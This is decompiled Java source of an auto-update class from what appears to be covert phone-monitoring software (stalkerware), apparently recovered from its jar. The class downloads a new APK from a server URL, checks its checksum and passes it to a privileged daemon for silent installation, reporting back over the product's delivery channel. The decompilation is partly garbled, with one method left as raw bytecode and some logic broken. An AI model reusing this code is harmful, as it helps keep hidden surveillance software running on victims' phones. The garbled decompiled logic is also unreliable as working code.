package com.vvt.autoupdate;

import android.content.ContentResolver;
import android.content.Context;
import android.net.Uri;
import android.util.Pair;
import com.vvt.base.RunningMode;
import com.vvt.datadeliverymanager.enums.DataProviderType;
import com.vvt.datadeliverymanager.enums.DeliveryRequestType;
import com.vvt.datadeliverymanager.enums.PriorityRequest;
import com.vvt.datadeliverymanager.h;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxSystemEvent;
import com.vvt.events.FxSystemEventCategories;
import com.vvt.exceptions.FxNullNotAllowedException;
import com.vvt.io.p;
import com.vvt.shell.ShellUtil;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class a
{
  private static final boolean b = com.vvt.ak.a.a;
  private static final boolean c = com.vvt.ak.a.e;
  com.vvt.datadeliverymanager.a.a a;
  private String d;
  private Context e;
  private com.vvt.datadeliverymanager.a.a f;
  private com.vvt.datadeliverymanager.b g;
  private RunningMode h;
  private com.vvt.base.a i;
  
  public a(String paramString, Context paramContext, RunningMode paramRunningMode, com.vvt.base.a parama)
  {
    b localb = new com/vvt/autoupdate/b;
    localb.<init>(this);
    this.a = localb;
    this.d = paramString;
    this.e = paramContext;
    this.h = paramRunningMode;
    this.i = parama;
  }
  
  /* Error */
  private String a(String paramString1, String paramString2) {
    // Byte code:
    //   0: aconst_null
    //   1: astore_3
    //   2: new 53	java/net/URL
    //   5: astore 4
    //   7: aload 4
    //   9: aload_1
    //   10: invokespecial 56	java/net/URL:<init>	(Ljava/lang/String;)V
    //   13: aload 4
    //   15: invokevirtual 60	java/net/URL:openConnection	()Ljava/net/URLConnection;
    //   18: astore 4
    //   20: aload 4
    //   22: checkcast 62	java/net/HttpURLConnection
    //   25: astore 4
    //   27: sipush 2000
    //   30: istore 5
    //   32: aload 4
    //   34: iload 5
    //   36: invokevirtual 67	java/net/HttpURLConnection:setConnectTimeout	(I)V
    //   39: ldc 69
    //   41: astore 6
    //   43: aload 4
    //   45: aload 6
    //   47: invokevirtual 72	java/net/HttpURLConnection:setRequestMethod	(Ljava/lang/String;)V
    //   50: aload 4
    //   52: invokevirtual 76	java/net/HttpURLConnection:getResponseCode	()I
    //   55: istore 5
    //   57: sipush 200
    //   60: istore 7
    //   62: iload 5
    //   64: iload 7
    //   66: if_icmpne +379 -> 445
    //   69: new 79	java/io/BufferedInputStream
    //   72: astore 8
    //   74: aload 4
    //   76: invokevirtual 83	java/net/HttpURLConnection:getInputStream	()Ljava/io/InputStream;
    //   79: astore 6
    //   81: aload 8
    //   83: aload 6
    //   85: invokespecial 86	java/io/BufferedInputStream:<init>	(Ljava/io/InputStream;)V
    //   88: new 88	java/io/File
    //   91: astore 9
    //   93: aload 9
    //   95: aload_2
    //   96: invokespecial 89	java/io/File:<init>	(Ljava/lang/String;)V
    //   99: new 91	java/io/FileOutputStream
    //   102: astore 6
    //   104: aload 6
    //   106: aload 9
    //   108: invokespecial 94	java/io/FileOutputStream:<init>	(Ljava/io/File;)V
    //   111: sipush 1024
    //   114: istore 10
    //   116: iload 10
    //   118: newarray <illegal type>
    //   120: astore 11
    //   122: aload 8
    //   124: aload 11
    //   126: invokevirtual 101	java/io/InputStream:read	([B)I
    //   129: istore 12
    //   131: iconst_m1
    //   132: istore 13
    //   134: iload 12
    //   136: iload 13
    //   138: if_icmpeq +93 -> 231
    //   141: iconst_0
    //   142: istore 13
    //   144: aload 6
    //   146: aload 11
    //   148: iconst_0
    //   149: iload 12
    //   151: invokevirtual 105	java/io/FileOutputStream:write	([BII)V
    //   154: goto -32 -> 122
    //   157: astore 11
    //   159: aload 6
    //   161: astore 14
    //   163: aload 8
    //   165: astore 6
    //   167: aload 9
    //   169: astore 8
    //   171: aload 4
    //   173: astore 9
    //   175: aload 14
    //   177: astore 4
    //   179: getstatic 30	com/vvt/autoupdate/a:MyUncaughtExceptionHandler	Z
    //   182: istore 10
    //   184: iload 10
    //   186: ifeq +3 -> 189
    //   189: aload 8
    //   191: invokevirtual 109	java/io/File:exists	()Z
    //   194: istore 10
    //   196: iload 10
    //   198: ifeq +9 -> 207
    //   201: aload 8
    //   203: invokevirtual 112	java/io/File:delete	()Z
    //   206: pop
    //   207: aload 4
    //   209: invokestatic 117	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   212: aload 6
    //   214: invokestatic 119	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   217: aload 9
    //   219: ifnull +8 -> 227
    //   222: aload 9
    //   224: invokevirtual 122	java/net/HttpURLConnection:disconnect	()V
    //   227: aconst_null
    //   228: astore_2
    //   229: aload_2
    //   230: areturn
    //   231: aload 6
    //   233: invokevirtual 125	java/io/FileOutputStream:flush	()V
    //   236: aload 6
    //   238: invokestatic 117	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   241: aload 8
    //   243: invokestatic 119	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   246: aload 4
    //   248: ifnull -19 -> 229
    //   251: aload 4
    //   253: invokevirtual 122	java/net/HttpURLConnection:disconnect	()V
    //   256: goto -27 -> 229
    //   259: astore 4
    //   261: iconst_0
    //   262: istore 7
    //   264: aconst_null
    //   265: astore 8
    //   267: aconst_null
    //   268: astore 9
    //   270: aload_3
    //   271: invokestatic 117	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   274: aload 8
    //   276: invokestatic 119	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   279: aload 9
    //   281: ifnull +8 -> 289
    //   284: aload 9
    //   286: invokevirtual 122	java/net/HttpURLConnection:disconnect	()V
    //   289: aload 4
    //   291: athrow
    //   292: astore 6
    //   294: iconst_0
    //   295: istore 7
    //   297: aconst_null
    //   298: astore 8
    //   300: aload 4
    //   302: astore 9
    //   304: aload 6
    //   306: astore 4
    //   308: goto -38 -> 270
    //   311: astore 6
    //   313: aload 4
    //   315: astore 9
    //   317: aload 6
    //   319: astore 4
    //   321: goto -51 -> 270
    //   324: astore_3
    //   325: aload 4
    //   327: astore 9
    //   329: aload_3
    //   330: astore 4
    //   332: aload 6
    //   334: astore_3
    //   335: goto -65 -> 270
    //   338: astore_3
    //   339: aload 6
    //   341: astore 8
    //   343: aload 4
    //   345: astore 14
    //   347: aload_3
    //   348: astore 4
    //   350: aload 14
    //   352: astore_3
    //   353: goto -83 -> 270
    //   356: astore 4
    //   358: aconst_null
    //   359: astore 4
    //   361: iconst_0
    //   362: istore 5
    //   364: aconst_null
    //   365: astore 6
    //   367: iconst_0
    //   368: istore 7
    //   370: aconst_null
    //   371: astore 8
    //   373: aconst_null
    //   374: astore 9
    //   376: goto -197 -> 179
    //   379: astore 6
    //   381: iconst_0
    //   382: istore 5
    //   384: aconst_null
    //   385: astore 6
    //   387: iconst_0
    //   388: istore 7
    //   390: aconst_null
    //   391: astore 8
    //   393: aload 4
    //   395: astore 9
    //   397: aconst_null
    //   398: astore 4
    //   400: goto -221 -> 179
    //   403: astore 6
    //   405: aload 8
    //   407: astore 6
    //   409: aload 4
    //   411: astore 9
    //   413: iconst_0
    //   414: istore 7
    //   416: aconst_null
    //   417: astore 8
    //   419: aconst_null
    //   420: astore 4
    //   422: goto -243 -> 179
    //   425: astore 6
    //   427: aload 8
    //   429: astore 6
    //   431: aload 9
    //   433: astore 8
    //   435: aload 4
    //   437: astore 9
    //   439: aconst_null
    //   440: astore 4
    //   442: goto -263 -> 179
    //   445: iconst_0
    //   446: istore 5
    //   448: aconst_null
    //   449: astore 6
    //   451: iconst_0
    //   452: istore 7
    //   454: aconst_null
    //   455: astore 8
    //   457: goto -221 -> 236
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	460	0	this	a
    //   0	460	1	paramString1	String
    //   0	460	2	paramString2	String
    //   1	270	3	localOutputStream	java.io.OutputStream
    //   324	6	3	localObject1	Object
    //   334	1	3	localObject2	Object
    //   338	10	3	localObject3	Object
    //   352	1	3	localObject4	Object
    //   5	247	4	localObject5	Object
    //   259	42	4	localObject6	Object
    //   306	43	4	localObject7	Object
    //   356	1	4	localException1	Exception
    //   359	82	4	localObject8	Object
    //   30	417	5	j	int
    //   41	196	6	localObject9	Object
    //   292	13	6	localObject10	Object
    //   311	29	6	localObject11	Object
    //   365	1	6	localObject12	Object
    //   379	1	6	localException2	Exception
    //   385	1	6	localObject13	Object
    //   403	1	6	localException3	Exception
    //   407	1	6	localObject14	Object
    //   425	1	6	localException4	Exception
    //   429	21	6	localObject15	Object
    //   60	393	7	k	int
    //   72	384	8	localObject16	Object
    //   91	347	9	localObject17	Object
    //   114	3	10	m	int
    //   182	15	10	bool	boolean
    //   120	27	11	arrayOfByte	byte[]
    //   157	1	11	localException5	Exception
    //   129	21	12	n	int
    //   132	11	13	i1	int
    //   161	190	14	localObject18	Object
    // Exception table:
    //   from	to	target	type
    //   116	120	157	java/lang/Exception
    //   124	129	157	java/lang/Exception
    //   149	154	157	java/lang/Exception
    //   231	236	157	java/lang/Exception
    //   2	5	259	finally
    //   9	13	259	finally
    //   13	18	259	finally
    //   20	25	259	finally
    //   34	39	292	finally
    //   45	50	292	finally
    //   50	55	292	finally
    //   69	72	292	finally
    //   74	79	292	finally
    //   83	88	292	finally
    //   88	91	311	finally
    //   95	99	311	finally
    //   99	102	311	finally
    //   106	111	311	finally
    //   116	120	324	finally
    //   124	129	324	finally
    //   149	154	324	finally
    //   231	236	324	finally
    //   179	182	338	finally
    //   189	194	338	finally
    //   201	207	338	finally
    //   2	5	356	java/lang/Exception
    //   9	13	356	java/lang/Exception
    //   13	18	356	java/lang/Exception
    //   20	25	356	java/lang/Exception
    //   34	39	379	java/lang/Exception
    //   45	50	379	java/lang/Exception
    //   50	55	379	java/lang/Exception
    //   69	72	379	java/lang/Exception
    //   74	79	379	java/lang/Exception
    //   83	88	379	java/lang/Exception
    //   88	91	403	java/lang/Exception
    //   95	99	403	java/lang/Exception
    //   99	102	425	java/lang/Exception
    //   106	111	425	java/lang/Exception
  }
  
  private void a(long paramLong, String paramString)
  {
    for (;;)
    {
      try
      {
        long l1 = com.vvt.k.a.a(paramString);
        boolean bool1 = b;
        if (bool1) {}
        bool2 = l1 < paramLong;
        if (!bool2) {
          continue;
        }
        Object localObject1 = new java/io/File;
        ((File)localObject1).<init>(paramString);
        ((File)localObject1).delete();
        localObject1 = this.f;
        if (localObject1 != null)
        {
          localObject1 = new java/lang/StringBuilder;
          localObject3 = "Binary checksum is mismatched.";
          ((StringBuilder)localObject1).<init>((String)localObject3);
          localObject3 = "line.separator";
          localObject3 = System.getProperty((String)localObject3);
          ((StringBuilder)localObject1).append((String)localObject3);
          localObject3 = new java/lang/StringBuilder;
          ((StringBuilder)localObject3).<init>();
          String str = "path: ";
          localObject3 = ((StringBuilder)localObject3).append(str);
          localObject3 = ((StringBuilder)localObject3).append(paramString);
          localObject3 = ((StringBuilder)localObject3).toString();
          ((StringBuilder)localObject1).append((String)localObject3);
          localObject3 = "line.separator";
          localObject3 = System.getProperty((String)localObject3);
          ((StringBuilder)localObject1).append((String)localObject3);
          localObject3 = new java/lang/StringBuilder;
          ((StringBuilder)localObject3).<init>();
          str = "server checksum: ";
          localObject3 = ((StringBuilder)localObject3).append(str);
          localObject3 = ((StringBuilder)localObject3).append(paramLong);
          localObject3 = ((StringBuilder)localObject3).toString();
          ((StringBuilder)localObject1).append((String)localObject3);
          localObject3 = "line.separator";
          localObject3 = System.getProperty((String)localObject3);
          ((StringBuilder)localObject1).append((String)localObject3);
          localObject3 = new java/lang/StringBuilder;
          ((StringBuilder)localObject3).<init>();
          str = "downloaded file checksum: ";
          localObject3 = ((StringBuilder)localObject3).append(str);
          localObject3 = ((StringBuilder)localObject3).append(paramLong);
          localObject3 = ((StringBuilder)localObject3).toString();
          ((StringBuilder)localObject1).append((String)localObject3);
          localObject3 = new java/lang/StringBuilder;
          ((StringBuilder)localObject3).<init>();
          str = "downloaded file size: ";
          localObject3 = ((StringBuilder)localObject3).append(str);
          long l2 = ShellUtil.c(paramString);
          localObject3 = ((StringBuilder)localObject3).append(l2);
          localObject3 = ((StringBuilder)localObject3).toString();
          ((StringBuilder)localObject1).append((String)localObject3);
          localObject3 = new com/vvt/datadeliverymanager/i;
          ((com.vvt.datadeliverymanager.i)localObject3).<init>();
          bool1 = false;
          str = null;
          ((com.vvt.datadeliverymanager.i)localObject3).b(false);
          localObject1 = ((StringBuilder)localObject1).toString();
          ((com.vvt.datadeliverymanager.i)localObject3).a((String)localObject1);
          localObject1 = this.f;
          ((com.vvt.datadeliverymanager.a.a)localObject1).b((com.vvt.datadeliverymanager.i)localObject3);
          return;
        }
      }
      catch (Exception localException)
      {
        Object localObject3 = this.f;
        if (localObject3 == null) {
          continue;
        }
        localObject3 = new com/vvt/datadeliverymanager/i;
        ((com.vvt.datadeliverymanager.i)localObject3).<init>();
        ((com.vvt.datadeliverymanager.i)localObject3).b(false);
        Object localObject2 = localException.getMessage();
        ((com.vvt.datadeliverymanager.i)localObject3).a((String)localObject2);
        localObject2 = this.f;
        ((com.vvt.datadeliverymanager.a.a)localObject2).b((com.vvt.datadeliverymanager.i)localObject3);
        continue;
        boolean bool2 = b;
        if (!bool2) {
          continue;
        }
        continue;
      }
      bool2 = b;
      if (bool2)
      {
        continue;
        b(paramString);
      }
    }
  }
  
  private void a(String paramString)
  {
    Object localObject1 = new com/vvt/events/FxSystemEvent;
    ((FxSystemEvent)localObject1).<init>();
    Object localObject2 = FxEventDirection.OUT;
    ((FxSystemEvent)localObject1).setDirection((FxEventDirection)localObject2);
    long l = System.currentTimeMillis();
    ((FxSystemEvent)localObject1).setEventTime(l);
    ((FxSystemEvent)localObject1).setMessage(paramString);
    localObject2 = FxSystemEventCategories.CATEGORY_DEBUG_MESSAGE;
    ((FxSystemEvent)localObject1).setLogType((FxSystemEventCategories)localObject2);
    boolean bool = b;
    if (bool) {}
    localObject2 = new java/util/ArrayList;
    ((ArrayList)localObject2).<init>();
    ((ArrayList)localObject2).add(localObject1);
    localObject1 = this.i;
    if (localObject1 != null)
    {
      localObject1 = this.i;
      ((com.vvt.base.a)localObject1).a((List)localObject2);
    }
  }
  
  private void b(String paramString)
  {
    boolean bool1 = true;
    boolean bool2 = b;
    if (bool2) {}
    Object localObject1 = this.h;
    Object localObject2 = RunningMode.FULL;
    Object localObject3;
    Object localObject4;
    if (localObject1 == localObject2)
    {
      localObject2 = d.b();
      localObject1 = (Boolean)((Pair)localObject2).first;
      bool2 = ((Boolean)localObject1).booleanValue();
      if (bool2)
      {
        localObject3 = new com/fx/a/a/a;
        ((com.fx.a.a.a)localObject3).<init>();
        bool2 = b;
        if (bool2) {}
        String[] arrayOfString = new String[2];
        arrayOfString[0] = "1";
        arrayOfString[bool1] = paramString;
        localObject1 = "AutoUpdateManager";
        localObject2 = this.e.getContentResolver();
        localObject4 = com.fx.a.a.b.f;
        long l = 180000L;
        bool2 = com.fx.daemon.b.a((String)localObject1, (ContentResolver)localObject2, (Uri)localObject4, (com.fx.daemon.a)localObject3, l, arrayOfString);
        localObject2 = new com/vvt/datadeliverymanager/i;
        ((com.vvt.datadeliverymanager.i)localObject2).<init>();
        if (bool2)
        {
          ((com.vvt.datadeliverymanager.i)localObject2).b(bool1);
          ((com.vvt.datadeliverymanager.i)localObject2).a("Auto update started.");
          localObject1 = this.f;
          ((com.vvt.datadeliverymanager.a.a)localObject1).b((com.vvt.datadeliverymanager.i)localObject2);
        }
      }
    }
    for (;;)
    {
      return;
      ((com.vvt.datadeliverymanager.i)localObject2).b(false);
      ((com.vvt.datadeliverymanager.i)localObject2).a("An error occured while starting update process!");
      localObject1 = this.f;
      ((com.vvt.datadeliverymanager.a.a)localObject1).b((com.vvt.datadeliverymanager.i)localObject2);
      continue;
      localObject4 = new com/vvt/datadeliverymanager/i;
      ((com.vvt.datadeliverymanager.i)localObject4).<init>();
      ((com.vvt.datadeliverymanager.i)localObject4).b(false);
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      localObject3 = ((StringBuilder)localObject1).append("Not enough free space. ");
      localObject1 = (String)((Pair)localObject2).second;
      localObject1 = (String)localObject1;
      ((com.vvt.datadeliverymanager.i)localObject4).a((String)localObject1);
      localObject1 = this.f;
      ((com.vvt.datadeliverymanager.a.a)localObject1).b((com.vvt.datadeliverymanager.i)localObject4);
      continue;
      localObject1 = this.h;
      localObject2 = RunningMode.LIMITED_1;
      if (localObject1 == localObject2)
      {
        localObject2 = new com/vvt/autoupdate/d;
        ((d)localObject2).<init>();
        localObject1 = this.e;
        ((d)localObject2).a((Context)localObject1);
        localObject1 = this.d;
        ((d)localObject2).a((String)localObject1);
        localObject4 = ((d)localObject2).d();
        localObject1 = (Boolean)((Pair)localObject4).first;
        bool2 = ((Boolean)localObject1).booleanValue();
        if (bool2)
        {
          localObject1 = new com/vvt/autoupdate/c;
          ((c)localObject1).<init>(this);
          ((d)localObject2).a(paramString, (e)localObject1);
        }
        else
        {
          localObject2 = new com/vvt/datadeliverymanager/i;
          ((com.vvt.datadeliverymanager.i)localObject2).<init>();
          ((com.vvt.datadeliverymanager.i)localObject2).b(false);
          localObject1 = new java/lang/StringBuilder;
          ((StringBuilder)localObject1).<init>();
          localObject3 = ((StringBuilder)localObject1).append("Not enough free space. ");
          localObject1 = (String)((Pair)localObject4).second;
          localObject1 = (String)localObject1;
          ((com.vvt.datadeliverymanager.i)localObject2).a((String)localObject1);
          localObject1 = this.f;
          ((com.vvt.datadeliverymanager.a.a)localObject1).b((com.vvt.datadeliverymanager.i)localObject2);
        }
      }
    }
  }
  
  public void a()
  {
    boolean bool = b;
    if (bool) {}
    Object localObject = this.g;
    if (localObject == null)
    {
      localObject = new com/vvt/exceptions/FxNullNotAllowedException;
      ((FxNullNotAllowedException)localObject).<init>("DataDelivery can not be null.");
      throw ((Throwable)localObject);
    }
    localObject = this.g;
    int j = 48;
    com.vvt.datadeliverymanager.a.a locala = this.a;
    ((com.vvt.datadeliverymanager.b)localObject).a(j, locala);
    bool = b;
    if (bool) {}
  }
  
  public void a(com.vvt.datadeliverymanager.a.a parama)
  {
    this.f = parama;
  }
  
  public void a(com.vvt.datadeliverymanager.b paramb)
  {
    this.g = paramb;
  }
  
  public void a(String url, long paramLong) {
    String str = p.a(this.d, "new_version.apk");
    str = a(url, str);
    a(paramLong, str);
  }
  
  public void b()
  {
    boolean bool = b;
    if (bool) {}
    String str = this.d;
    bool = d.c(str);
    if (bool)
    {
      bool = b;
      if (bool) {}
      str = d.d(this.d);
      a(str);
      str = this.d;
      d.e(str);
    }
    for (;;)
    {
      bool = b;
      if (bool) {}
      return;
      bool = b;
      if (!bool) {}
    }
  }
  
  public void c()
  {
    boolean bool1 = true;
    h localh = new com/vvt/datadeliverymanager/h;
    localh.<init>();
    localh.a(48);
    Object localObject = new com/vvt/phoenix/prot/command/i;
    ((com.vvt.phoenix.prot.command.i)localObject).<init>();
    localh.a((com.vvt.phoenix.prot.command.b)localObject);
    localObject = this.a;
    localh.a((com.vvt.datadeliverymanager.a.a)localObject);
    localObject = DeliveryRequestType.REQUEST_TYPE_NEW;
    localh.a((DeliveryRequestType)localObject);
    localObject = PriorityRequest.PRIORITY_NORMAL;
    localh.a((PriorityRequest)localObject);
    localObject = DataProviderType.DATA_PROVIDER_TYPE_NONE;
    localh.a((DataProviderType)localObject);
    int j = 5;
    localh.c(j);
    long l = 180000L;
    localh.b(l);
    localh.c(bool1);
    localh.b(bool1);
    localObject = this.g;
    ((com.vvt.datadeliverymanager.b)localObject).a(localh);
    boolean bool2 = b;
    if (bool2) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/autoupdate/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */